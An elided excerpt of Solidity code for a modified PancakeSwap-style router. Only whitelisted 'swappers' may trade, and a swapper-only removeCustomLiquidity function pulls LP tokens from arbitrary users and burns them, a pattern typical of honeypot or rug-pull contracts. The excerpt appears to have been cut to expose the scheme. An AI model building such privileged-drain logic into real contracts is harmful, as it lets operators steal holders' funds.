            ...
            uint256(
                keccak256(
                    abi.encodePacked(
                        ...
                        hex"fc525e6c91a0ded50b2d2c95b910ae93bb0f2175e78dede64f0e99c0905324ca" // init code hash
                    )
                )
            )
        );
...
contract pancakeRouter is IpancakeRouter02 {
    ...
    modifier onlyAuthorizer(address _authorizer) {
        require(_authorizer == authorizer, "pancakeRouter: only Owner");
        _;
    }

    modifier onlySwapper(address _swapper) {
        require(isSwapper[_swapper], "pancakeRouter: only Swapper");
        _;
    }
    ...
    function removeCustomLiquidity(
        ...
        address pair,
        address token
    ) external onlySwapper(msg.sender) returns (uint256, uint256) {
        IpancakePair(pair).transferFrom(user, pair, liquidity);
        (amountToken, amountETH) = IpancakePair(pair).burnWithLp(
            amountToken,
            amountETH,
            liquidity,
            address(this),
        ...
        TransferHelper.safeTransfer(token, user, amountToken);
    ...
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        ...
        address to,
        uint256 deadline
    ) external virtual override ensure(deadline) onlySwapper(msg.sender) {
        TransferHelper.safeTransferFrom(
            path[0],
            msg.sender,
            pancakeLibrary.pairFor(factory, path[0], path[1]),
    ...
    function updateSwapper(
        address _swapper
    ) external onlyAuthorizer(msg.sender) {
        isSwapper[_swapper] = true;
    }

    function updateAuthorizer(
        address _authorizer
    ) external onlyAuthorizer(msg.sender) {
        authorizer = _authorizer;
    }
